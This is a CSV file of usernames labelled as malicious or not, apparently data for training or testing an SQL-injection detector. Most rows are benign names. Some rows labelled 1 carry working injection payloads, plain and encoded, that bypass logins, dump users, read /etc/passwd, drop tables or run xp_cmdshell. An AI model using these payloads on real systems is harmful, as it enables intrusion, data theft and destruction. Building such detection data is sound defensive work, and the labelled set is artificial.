name,is_malicious
jasondrake,0
rachel91,0
joshuabarnett,0
icruz,0
glenn09,0
osmith,0
glen43,0
lbanks,0
jamessilva' OR CHAR(49)=CHAR(49)--,1
leenancy,0
ashleyellis,0
xpachecoCHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
casey58' OR 0x50=0x50--,1
erindavis,0
amccarthy,0
adkinsalexis,0
vcollins,0
vtate,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
yball,0
thomasflynn,0
timothy38,0
longjulie,0
burnsmichael,0
bryan13,0
ronaldsmith,0
carol56,0
wnovak,0
tbennett0x270x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
jessicacastillo,0
jeffrey25,0
nshah,0
brownkevin,0
edwardsmonica,0
ipalmer,0
boonedaniel,0
bryanmckinney,0
donnagonzalez,0
fischermichael,0
pennyhansenCHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(49)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(79)CHAR(85)CHAR(78)CHAR(84)CHAR(40)CHAR(42)CHAR(41)CHAR(44)CHAR(67)CHAR(79)CHAR(78)CHAR(67)CHAR(65)CHAR(84)CHAR(40)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(85)CHAR(82)CHAR(82)CHAR(69)CHAR(78)CHAR(84)CHAR(95)CHAR(85)CHAR(83)CHAR(69)CHAR(82)CHAR(40)CHAR(41)CHAR(41)CHAR(44)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(70)CHAR(76)CHAR(79)CHAR(79)CHAR(82)CHAR(40)CHAR(82)CHAR(65)CHAR(78)CHAR(68)CHAR(40)CHAR(48)CHAR(41)CHAR(42)CHAR(50)CHAR(41)CHAR(41)CHAR(120)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(73)CHAR(78)CHAR(70)CHAR(79)CHAR(82)CHAR(77)CHAR(65)CHAR(84)CHAR(73)CHAR(79)CHAR(78)CHAR(95)CHAR(83)CHAR(67)CHAR(72)CHAR(69)CHAR(77)CHAR(65)CHAR(46)CHAR(80)CHAR(76)CHAR(85)CHAR(71)CHAR(73)CHAR(78)CHAR(83)CHAR(32)CHAR(71)CHAR(82)CHAR(79)CHAR(85)CHAR(80)CHAR(32)CHAR(66)CHAR(89)CHAR(32)CHAR(120)CHAR(41)CHAR(97)CHAR(41)CHAR(45)CHAR(45),1
enelson,0
richardball,0
annpatel' OR CHAR(49)=CHAR(49)--,1
austin51,0
melissa32,0
bcombs,0
'/**/OR/**/'1'='1,1
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
waterslaura,0
lthomas,0
parkercolon,0
'%20OR%201=1--,1
xmoses,0
buchananronald,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
todd98,0
jjackson,0
usmith,0
turnermegan,0
leeamy,0
harperjohn,0
kennedyjoseph,0
eduran' OR SOUNDEX('test')=SOUNDEX('test')--,1
kstevens,0
arthurcollins,0
tylerrodriguez,0
danielle14,0
underwoodjason,0
ncole,0
'%27%20OR%201=1--,1
gfleming,0
moralesjonathan,0
daniel23,0
fosteramy,0
williamsamber,0
howellpatrick,0
greenekathy0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
catherineperkins,0
devonrobinson0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
enorton,0
%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
xarnold,0
"jenningsoscar' OR BENCHMARK(10000000,MD5(NOW()))--",1
raymond33,0
nandrade,0
jenniferperez,0
karendaniels,0
robert28,0
uwhite,0
acevedokurt,0
lisabeanCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(61)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
pfreeman,0
bradley20,0
silvaamanda,0
harrisethan,0
' OR CHAR(49)=CHAR(49)--,1
heidi94,0
hgarner,0
katherine25,0
schneiderdanny,0
john69,0
gcarr,0
jonathanfreeman,0
kanejohn,0
mosborne,0
robertstracey,0
zsalas,0
rhayes,0
heather88,0
icunningham,0
mcdonaldcory,0
karenatkins,0
prodriguez,0
daniellereed,0
wbrooks,0
darrenparker,0
joann96,0
webblori,0
russellbrenda,0
kyle89,0
collinsbrittany,0
jasonhughes,0
shawnbradley,0
davenportjonathan,0
davidwright,0
jmcintosh,0
audreyedwards,0
marissa66,0
andrew28,0
wking,0
yalvarez,0
vanessamendoza,0
nancy83,0
rhonda47,0
bethpowers,0
murphycody,0
john32,0
johnsonerin,0
' OR BINARY 'a'='a'--,1
rickevans0x270x200x410x4e0x440x200x280x530x450x4c0x450x430x540x200x310x200x460x520x4f0x4d0x280x530x450x4c0x450x430x540x200x430x4f0x550x4e0x540x280x2a0x290x2c0x430x4f0x4e0x430x410x540x280x300x780x330x610x2c0x280x530x450x4c0x450x430x540x200x430x550x520x520x450x4e0x540x5f0x550x530x450x520x280x290x290x2c0x300x780x330x610x2c0x460x4c0x4f0x4f0x520x280x520x410x4e0x440x280x300x290x2a0x320x290x290x780x200x460x520x4f0x4d0x200x490x4e0x460x4f0x520x4d0x410x540x490x4f0x4e0x5f0x530x430x480x450x4d0x410x2e0x500x4c0x550x470x490x4e0x530x200x470x520x4f0x550x500x200x420x590x200x780x290x610x290x2d0x2d,1
hmiller,0
dustinnewton,0
%27 %55%4e%49%4f%4e %53%45%4c%45%43%54 %2a %46%52%4f%4d %75%73%65%72%73--,1
pmiller' OR SOUNDEX('test')=SOUNDEX('test')--,1
marshallamy,0
crussell,0
craigchen,0
samanthaschmitt,0
emily73,0
rosschase,0
robinsonmonique,0
samantha57,0
ellisonantonio'||'1'='1,1
zachary01,0
ashleybrown,0
ritahiggins,0
burnettrachel,0
amymarshall,0
gandrews,0
danielknapp,0
henryrebecca,0
lbarnes,0
ohall,0
markkelley,0
edwardwilliams,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
sbrown,0
mallen,0
johnferrell'/**/OR/**/'1'='1,1
darryl87,0
savagewilliam,0
anthonyrichard,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
samuelgreen,0
pfloresCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(69)CHAR(78)CHAR(67)CHAR(72)CHAR(77)CHAR(65)CHAR(82)CHAR(75)CHAR(40)CHAR(49)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(44)CHAR(77)CHAR(68)CHAR(53)CHAR(40)CHAR(78)CHAR(79)CHAR(87)CHAR(40)CHAR(41)CHAR(41)CHAR(41)CHAR(45)CHAR(45),1
sheila93,0
lisaadams,0
campbelljennifer,0
wattsnicole,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
zmartinez,0
michelle95,0
fbenton,0
lcampbell,0
sandramartinez,0
contrerasroberta,0
xcooper,0
%27 %4f%52 %27%31%27%3d%27%31,1
0x270x3b0x200x440x520x4f0x500x200x540x410x420x4c0x450x200x750x730x650x720x730x2d0x2d,1
%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
michelle83,0
"danielwilliamson' OR BENCHMARK(10000000,MD5(NOW()))--",1
peter62,0
mark82,0
dustinjones,0
thomas18,0
carol20,0
colemankathy,0
ghughes,0
kayleebaker,0
harperjeffrey,0
davismichael,0
mcintoshjamie,0
jameslee,0
wendylam,0
gregory10,0
chavezjared,0
lflores,0
nielsenharold,0
daniellebates,0
'||'1'='1,1
richard27,0
%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
owright,0
umorrison,0
susan33,0
egarner,0
clifford73,0
smithcarla,0
jmorgan,0
jessicacopeland,0
rachel93' OR 0x50=0x50--,1
kathrynbrown,0
cruzkevin,0
gene72%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
pauljones,0
emily92,0
marktucker,0
edwardskaitlyn'%27%20OR%201=1--,1
calebjuarez,0
padillamichele' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
roberthansen%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
boylenathan,0
qgates,0
williamsmith,0
bennettadam,0
ariellopez,0
hahnmatthew,0
lbishop,0
ngarcia,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
matthew08,0
zamorakent,0
0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
qduffy,0
petersonkaren,0
shepherdashlee,0
lindahernandez,0
kcollins,0
teresa53,0
gomezrussell,0
cyoder%27 %55%4e%49%4f%4e %53%45%4c%45%43%54 %2a %46%52%4f%4d %75%73%65%72%73--,1
roymaria,0
tashahamilton,0
daguilar,0
jonathan82,0
wberg,0
martinezeric,0
monroemallory,0
walkerrobert'; DROP TABLE users--,1
0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
dbraun,0
ipineda,0
crystalhensley,0
dilloncoleman,0
rlawrence,0
' UNION SELECT * FROM users--,1
dianethornton,0
hicksrobin' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
klee,0
simmonsmichael' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
tyrone91,0
raymondjohnson,0
brandonfisher,0
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
emilygray,0
william00,0
luceroangela,0
nicholaswilliams,0
erin88,0
qrobinson,0
princepeggy' OR 0x50=0x50--,1
stephen34,0
waltonchristopher,0
vazquezkevin,0
tara73,0
crystalbrown,0
' UNION SELECT * FROM users--,1
terrynelson,0
jasonwalker,0
eric31,0
0x270x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
larry71,0
meganking,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
xwillis,0
speters,0
haydenmeghan,0
andrewgriffin,0
xmorrison,0
"michellemartinez'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
sallen,0
gregory82,0
emoreno,0
mirandajeffrey,0
kristenburns,0
kellyobrien,0
toni74,0
qflynn0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
ryanrobert,0
richard07,0
brandy37,0
nguyendenise,0
stephaniegill,0
ashley23,0
gcook,0
brianna16,0
michaelwilliams,0
charlesking,0
millselizabeth,0
millssophia,0
sperez,0
tsantos,0
harrisjeremy,0
holly85,0
lanejason,0
steven77,0
hross,0
mlarsen,0
meganfernandez,0
brandonchandler,0
ehunter,0
omalone,0
ronald18,0
cooketeresa,0
cookjuan,0
joseph73,0
wsmith,0
joshua06,0
ronnierodriguez,0
william52,0
0x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
ffrank,0
kimberly43,0
fuentesnicole,0
deanna56,0
aaron92,0
ehouston,0
'/**/OR/**/'1'='1,1
shelbyhall,0
melaniewalters,0
"clawson' OR BENCHMARK(10000000,MD5(NOW()))--",1
nealmatthew,0
villanuevaerika,0
josephhaynes,0
michaela00,0
markwhite,0
smithtrevor,0
carl04,0
taylordanielle'; EXEC xp_cmdshell('dir')--,1
tracy35,0
mgutierrez,0
fuenteschristopher,0
zfoster,0
nicolas01,0
zfields,0
'%27%20OR%201=1--,1
echapman,0
amandacox,0
kevans,0
nlowery,0
sthompson,0
ebernard,0
ericewing,0
richard50,0
michaelburns,0
nicholasmorgan,0
hurstsean,0
jessegonzalez,0
whitekatrina,0
blakeholly,0
jeremyhumphrey,0
ashleyvargas,0
daniel59,0
caldwellcaleb,0
newmanandrew,0
william81,0
jyang,0
maryvaughn,0
rebeccagalvan,0
uking,0
melodyyates,0
cwalker,0
laura86,0
kwallace,0
juliesmith,0
garciaalexa,0
david04,0
jessica93,0
kristi15,0
danielwalton,0
xtate,0
lwalker,0
brookssean,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
jessicanorris,0
marcrussell,0
melissaolsen,0
jamessantos,0
angelareed0x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
jdavis,0
daniellejohnson,0
fergusonrichard,0
nancy90,0
jacquelineruiz,0
jenny48,0
sheliathomas,0
joseph00,0
baileyderrick,0
wendy97,0
perryluke,0
huffalexis,0
sharonrichardson,0
tracymitchell,0
michelle82,0
vanessa06,0
"donald33'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
vhoward,0
rwilson,0
jsmith,0
slamb0x270x2b0x280x530x450x4c0x450x430x540x200x270x300x270x200x460x520x4f0x4d0x200x750x730x650x720x730x200x570x480x450x520x450x200x750x730x650x720x6e0x610x6d0x650x3d0x270x610x640x6d0x690x6e0x270x200x410x4e0x440x200x530x550x420x530x540x520x490x4e0x470x280x700x610x730x730x770x6f0x720x640x2c0x310x2c0x310x290x3d0x270x610x270x290x2b0x27,1
paulroy,0
scottpatricia,0
nsweeney,0
bellkaren,0
timothylandry,0
guerradarlene,0
brian54,0
cvazquez,0
ymartin,0
lamjoseph,0
' UNION SELECT * FROM users--,1
heatherchavez,0
jessica88,0
' OR '1'='1,1
parkersamantha,0
johnsonlauren,0
alexandrascott,0
bridgesrobert,0
matthew53,0
maria79,0
cabrerapatricia0x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
whitakereric,0
"vwelch' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
sarahvaughn,0
xcruz,0
codyjones,0
annscott,0
hooverjessica,0
christina49,0
susanchapman,0
mgay,0
scottkim,0
laura52,0
kathrynfrederick,0
millerkelly,0
kimmartinez,0
adaniel,0
adamsandrew,0
stephensonjoseph,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
'; DROP TABLE users--,1
lisacarter,0
hooverjeremy,0
adamflores,0
jacobsjoshua,0
danielstephens,0
lydiascott,0
williamsoncassidy,0
john72,0
wilsonleonard,0
stephenadams,0
cjensen' OR SOUNDEX('test')=SOUNDEX('test')--,1
robertcastillo,0
april98,0
' UNION SELECT * FROM users--,1
lauren99,0
brenda22,0
christopherblevins,0
paulwade,0
taylor79,0
tinagrant,0
brittanyguzman,0
mcollier,0
randyrobinson,0
annthomas,0
ymorrison%27%7c%7c%27%31%27%3d%27%31,1
agray,0
'||'1'='1,1
masonquinn,0
michaelelliott,0
joshuabarber,0
taraadams,0
kweeks,0
hartsharon,0
nwilliams,0
"lawsonjohn'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
bthomas,0
ryanwood,0
kelleyvictor,0
vnorris' OR 1=1--,1
heatheranderson,0
zglover,0
aaronyoung,0
ipatel,0
kimberly56,0
taraanderson,0
kennethpatrick,0
veronicapham,0
'%27%20OR%201=1--,1
harmonwarren,0
lamwilliam,0
tmacias,0
carolyn54,0
lisa72,0
hollowaythomas,0
reynoldsjessica,0
laura83,0
kpeterson,0
michaelwilliams,0
hayleygutierrez,0
brownbrian,0
douglaschris,0
tcasey,0
james82,0
john79,0
pettyamber,0
phillipsthomas0x270x3b0x200x450x580x450x430x200x780x700x5f0x630x6d0x640x730x680x650x6c0x6c0x280x270x640x690x720x270x290x2d0x2d,1
belljames,0
johnsanders,0
beth95,0
kennedytimothy,0
idavis,0
longcolleen,0
kingsarah,0
daviskimberly,0
tdelgado,0
jacobanderson,0
vrush,0
nicholascabrera,0
patriciahill,0
ieverett,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
jose69,0
colesarah,0
frederickharrison,0
bmartinez,0
jthomas,0
meghankline,0
johnsonbrandy,0
christophernichols,0
johnsonvictor,0
mendozascott,0
khenson,0
gmann,0
leealexander,0
dramirez,0
lindsaymaynard,0
william64,0
lmason,0
brownkathleen,0
brownkatherine,0
john80,0
hintonmatthew,0
'%20OR%201=1--,1
clarkescott,0
stevenmccoy,0
vmathews,0
manuel25,0
jessicamiller,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
freemankelsey,0
qjohnson'||'1'='1,1
brandi54,0
crystal28,0
liumatthew,0
robersonkeith,0
lpratt,0
jacob01,0
hollygarrett,0
jeff75,0
wilcoxjeffrey,0
burchkyle' OR CHAR(49)=CHAR(49)--,1
cassandra76,0
peterjohnson,0
cynthia80,0
oliviahayes,0
robinsondenise,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
palmeraustin,0
nreid,0
thomasmoon,0
connie42,0
andrew02,0
' UNION SELECT * FROM users--,1
kelly89,0
twells,0
carneydavid,0
jonathonbenitez'||'1'='1,1
tbarker,0
kristinguerrero,0
veronica46,0
wellscory' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
ericwells,0
grantmichael,0
nlambert,0
jennifer01,0
jose04' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
taylor59,0
cheryl47' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
katelyn54,0
thomashuff' OR SOUNDEX('test')=SOUNDEX('test')--,1
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
daniel89,0
proctorjeffery,0
jhale,0
sharon81,0
ibradley,0
brandon52,0
christopher93,0
zmiles' OR CHAR(49)=CHAR(49)--,1
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
williamshenryCHAR(39)CHAR(59)CHAR(32)CHAR(69)CHAR(88)CHAR(69)CHAR(67)CHAR(32)CHAR(120)CHAR(112)CHAR(95)CHAR(99)CHAR(109)CHAR(100)CHAR(115)CHAR(104)CHAR(101)CHAR(108)CHAR(108)CHAR(40)CHAR(39)CHAR(100)CHAR(105)CHAR(114)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
philip24,0
mccoypatrick,0
ioconnor,0
jennifer11,0
hmartinez,0
jennifer25,0
carlos31,0
reyesmichael,0
rebecca50,0
allisonwilliams,0
nicholas87,0
williamholmes,0
caitlynalexander,0
baileyjason,0
freemankenneth,0
samantha30,0
acharles,0
kyleglover,0
hallevan,0
stephen18,0
christopher58CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
alexandra68,0
elizabeth87'/**/OR/**/'1'='1,1
malonebrittany,0
bsampson,0
jillian06'; EXEC xp_cmdshell('dir')--,1
mendozabrittany,0
wilkinsonrebecca,0
wgriffin,0
knavarro,0
nlarson,0
karen28,0
marksmith,0
prestonanderson,0
matthewwood,0
%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
amy08,0
hamptondeborah,0
jasonli,0
david94,0
zsherman,0
denise73,0
jilldaniels,0
ssawyer,0
bradleyhernandez,0
juliewilcox,0
crosbyjennifer'%27%20OR%201=1--,1
victoriafisher,0
evan10,0
murphyanthony,0
jeremy43,0
%27 %4f%52 %28%53%45%4c%45%43%54 %2a %46%52%4f%4d %28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%62%41%4b%4c%29--,1
ipowell,0
olsonwilliam' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
frivera,0
scrawford,0
jfisher,0
anthonyhull,0
joseph78,0
wrightnicholas,0
"robert24'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
lisavaldez,0
hallkevin,0
daniellejohnson,0
tcross,0
williamestrada,0
jlove,0
wthompson,0
johnbyrd,0
john58,0
CHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
carlcabrera,0
jamesriley,0
melanie94,0
blankenshipjesse,0
mark86,0
marissalopez,0
' OR 0x50=0x50--,1
'; DROP TABLE users--,1
johnsonnicole,0
wbell,0
jacob90,0
patrick98,0
'||'1'='1,1
' UNION SELECT * FROM users--,1
dmccormick,0
epage,0
todd49,0
wyattbrady,0
johnsoncharles,0
%27 %4f%52 %42%49%4e%41%52%59 %27%61%27%3d%27%61%27--,1
karilopez,0
lsuarez' OR SOUNDEX('test')=SOUNDEX('test')--,1
carlosroberts,0
stephanie62,0
michaelrobinson,0
perry93,0
kevin91,0
christopher21,0
williamserin,0
patrickmclean,0
anthonywilson,0
davidmartin,0
cowen,0
veronicacruz,0
ritteranthony,0
linda88,0
brianelliott,0
ashleyzamora,0
xrobinson,0
christinanorris,0
rebeccawilliams,0
matthew28,0
henrytyler,0
ronald31,0
traceyjones,0
hannahward,0
williamsonanthony,0
edward22,0
lauren83,0
jessicamaldonado,0
gshaw,0
larryrodriguez,0
%27%3b %44%52%4f%50 %54%41%42%4c%45 %75%73%65%72%73--,1
wugary,0
roger10,0
briannatran,0
rbest,0
schmidtandrew,0
kevin40,0
brettthomas,0
' OR 1=1--,1
hernandezkimberly,0
patty56,0
jacksonnicole,0
liuchristina,0
dennisunderwood,0
meganerickson,0
hawkinsleah,0
guerrerobrianna,0
nadams,0
harveytanner,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
adrienne12,0
darlenelewis,0
steven42,0
ibrown,0
mgriffith,0
derekjohnston,0
mscott,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
kathypowell,0
gailblair,0
ebrown,0
zacharyevans,0
gutierrezsherry,0
joanfrancis,0
timothyrodriguez,0
john59,0
thomasalexandra%27%3b %44%52%4f%50 %54%41%42%4c%45 %75%73%65%72%73--,1
judith55,0
christopher27,0
fevans,0
matthewrobertson,0
cdavis,0
travismichael,0
rwallace,0
websterfrank' OR '1'='1,1
ashleywright,0
albert54,0
sara36,0
dodsonchristopher,0
esmith,0
'%27%20OR%201=1--,1
rodneyalexander,0
oscarashley,0
anitabrown,0
lisa72,0
tammyglover,0
kerri22,0
danderson,0
' OR 1=1--,1
maryschmitt,0
mfisher'%27%20OR%201=1--,1
elizabeth83,0
0x270x3b0x200x450x580x450x430x200x780x700x5f0x630x6d0x640x730x680x650x6c0x6c0x280x270x640x690x720x270x290x2d0x2d,1
maureenrobertson,0
hendersonstacy,0
brenda98,0
jasonshannon,0
ewade%27 %4f%52 %42%45%4e%43%48%4d%41%52%4b%28%31%30%30%30%30%30%30%30%2c%4d%44%35%28%4e%4f%57%28%29%29%29--,1
khenderson,0
suzanne42,0
mlopez,0
justinwashington,0
vjohnson,0
gonzalezphillip,0
christophermorris,0
noblemichael,0
